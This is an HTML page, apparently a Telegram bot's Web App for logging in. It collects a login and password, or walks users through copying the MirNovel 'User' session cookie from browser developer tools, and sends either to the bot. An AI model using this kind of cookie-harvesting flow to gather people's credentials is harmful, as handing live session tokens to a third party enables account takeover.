<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Авторизация</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root {
            --primary-color: #2c3e50;
            --secondary-color: #3498db;
            --error-color: #e74c3c;
            --background-color: #f9f9f9;
            --text-color: #333;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--background-color);
            color: var(--text-color);
            padding: 20px;
            margin: 0;
            line-height: 1.6;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 30px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            position: relative;
        }

        .notification {
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .error-notification {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
            color: #721c24;
        }

        h2 {
            color: var(--primary-color);
            text-align: center;
            margin-bottom: 20px;
            font-size: 2em;
        }

        .instructions {
            background: #f8f9fa;
            padding: 25px;
            border-radius: 8px;
            margin: 20px 0;
        }

        .step {
            margin-bottom: 15px;
            padding: 15px;
            background: white;
            border-left: 4px solid var(--secondary-color);
            border-radius: 4px;
        }

        .platform-tabs {
            display: flex;
            gap: 10px;
            margin: 15px 0;
        }

        .platform-tab {
            padding: 10px 20px;
            border-radius: 20px;
            cursor: pointer;
            background: #e0e0e0;
            transition: all 0.3s ease;
        }

        .platform-tab.active {
            background: var(--secondary-color);
            color: white;
        }

        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 2px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }

        input:focus {
            border-color: var(--secondary-color);
            outline: none;
        }

        button.primary {
            background: var(--secondary-color);
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            transition: background 0.3s ease;
            margin-top: 15px;
        }

        button.primary:hover {
            background: #2980b9;
        }

        .code-block {
            background: #2c3e50;
            color: white;
            padding: 15px;
            border-radius: 6px;
            font-family: monospace;
            margin: 10px 0;
        }

        .highlight {
            color: var(--secondary-color);
            font-weight: bold;
        }

        .hidden {
            display: none;
        }

        .input-group {
            margin: 25px 0;
        }

        .sub-step {
            margin-left: 20px;
            color: #666;
        }
    </style>
    <script async src="https://telegram.org/js/telegram-web-app.js"></script>
    <script>
        const siteInstructions = {
            'mirnovel': {
                'token': `
                    <div class="platform-tabs">
                        <div class="platform-tab active" onclick="showPlatform('pc')">ПК</div>
                        <div class="platform-tab" onclick="showPlatform('mobile')">Мобильные</div>
                    </div>

                    <div id="pc-instructions">
                        ${generateSteps([
                            'Откройте браузер и перейдите на сайт MirNovel',
                            'Откройте инструменты разработчика:',
                            'Нажмите клавишу F12 или кликните правой кнопкой мыши → "Просмотреть код"',
                            'Перейдите на вкладку "Приложение" (Application/Storage)',
                            'В левой панели выберите раздел Cookies → домен сайта',
                            'Найдите параметр User и скопируйте значение из колонки Value'
                        ], true)}
                    </div>

                    <div id="mobile-instructions" class="hidden">
                        ${generateSteps([
                            'Установите браузер с инструментами разработчика:',
                            'Kiwi Browser, DebugAnywhere или аналогичный',
                            'Откройте сайт через выбранный браузер',
                            'Активируйте инструменты разработчика:',
                            'В Kiwi Browser: Настройки → Режим разработчика',
                            'Перейдите в раздел Application → Cookies',
                            'Найдите параметр User и скопируйте значение'
                        ], true)}
                    </div>
                `,
                'login': `
                    ${generateSteps([
                        'Введите ваш логин и пароль',
                        'Нажмите кнопку подтверждения'
                    ])}
                `
            }
        };

        function showNotification(message, type = 'error') {
            const notification = document.createElement('div');
            notification.className = `notification ${type}-notification`;
            notification.innerHTML = `
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM13 17H11V15H13V17ZM13 13H11V7H13V13Z" fill="currentColor"/>
                </svg>
                <div>${message}</div>
            `;
            
            const container = document.querySelector('.container');
            container.insertBefore(notification, container.firstChild);
            
            setTimeout(() => notification.remove(), 5000);
        }

        function generateSteps(steps, withSubsteps = false) {
            return steps.map((text, index) => {
                const isSubstep = text.endsWith(':');
                return `
                    <div class="step ${isSubstep ? 'sub-step' : ''}">
                        <span class="highlight">${isSubstep ? '•' : `Шаг ${index + 1}:`}</span> ${text}
                        ${withSubsteps && index === 1 ? `
                            <div class="sub-step">${['F12', 'ПКМ → Инспектор'].map(t => `• ${t}`).join('<br>')}</div>
                        ` : ''}
                        ${withSubsteps && index === 3 ? `
                            <div class="sub-step">(В верхнем меню инструментов разработчика)</div>
                        ` : ''}
                        ${withSubsteps && index === 4 ? `
                            <div class="sub-step">(Найдите домен mirnovel в списке)</div>
                        ` : ''}
                    </div>
                `;
            }).join('');
        }

        function getQueryParam(name) {
            return new URLSearchParams(window.location.search).get(name);
        }

        function showPlatform(platform) {
            document.querySelectorAll('.platform-tab').forEach(tab => 
                tab.classList.toggle('active', tab.textContent.toLowerCase().includes(platform))
            );
            document.getElementById('pc-instructions').classList.toggle('hidden', platform !== 'pc');
            document.getElementById('mobile-instructions').classList.toggle('hidden', platform !== 'mobile');
        }

        function validateParams() {
            const requiredParams = ['method', 'site'];
            const missingParams = requiredParams.filter(param => !getQueryParam(param));
            
            if (missingParams.length > 0) {
                showNotification(`Отсутствуют обязательные параметры: ${missingParams.join(', ')}`);
                document.querySelector('.container').classList.add('hidden');
                return false;
            }
            
            const validMethods = ['token', 'login'];
            const method = getQueryParam("method");
            
            if (!validMethods.includes(method)) {
                showNotification(`Неподдерживаемый метод авторизации: ${method}`);
                document.querySelector('.container').classList.add('hidden');
                return false;
            }
            
            return true;
        }

        function initForm() {
            if (!validateParams()) return;

            const method = getQueryParam("method");
            const site = getQueryParam("site");

            document.title = site;
            document.querySelector('h2').textContent = site;

            document.getElementById(`${method}Form`).style.display = 'block';
            
            const instructions = siteInstructions[site]?.[method] || `
                ${generateSteps(['Следуйте стандартной процедуре авторизации'])}
            `;
            
            document.getElementById('dynamic-instructions').innerHTML = instructions;
            if(method === 'token') showPlatform('pc');
        }

        function submitData() {
            const method = getQueryParam("method");
            let authData = { method };

            if (method === 'login') {
                authData.login = document.getElementById('login').value;
                authData.password = document.getElementById('password').value;
                
                if (!authData.login || !authData.password) {
                    showNotification('Заполните все поля!');
                    return;
                }
            } else {
                authData.token = document.getElementById('token').value;
                
                if (!authData.token) {
                    showNotification('Введите токен!');
                    return;
                }
            }

            Telegram.WebApp.sendData(JSON.stringify(authData));
            Telegram.WebApp.close();
        }

        window.onload = initForm;
    </script>
</head>
<body>
    <div class="container">
        <h2></h2>
        
        <div class="instructions" id="dynamic-instructions"></div>

        <div class="input-group">
            <div id="loginForm" class="hidden">
                <input type="text" id="login" placeholder="Логин" required>
                <input type="password" id="password" placeholder="Пароль" required>
            </div>

            <div id="tokenForm" class="hidden">
                <input type="text" id="token" placeholder="Введите токен" required>
            </div>
        </div>

        <button class="primary" onclick="submitData()">Подтвердить</button>
    </div>
</body>
</html>
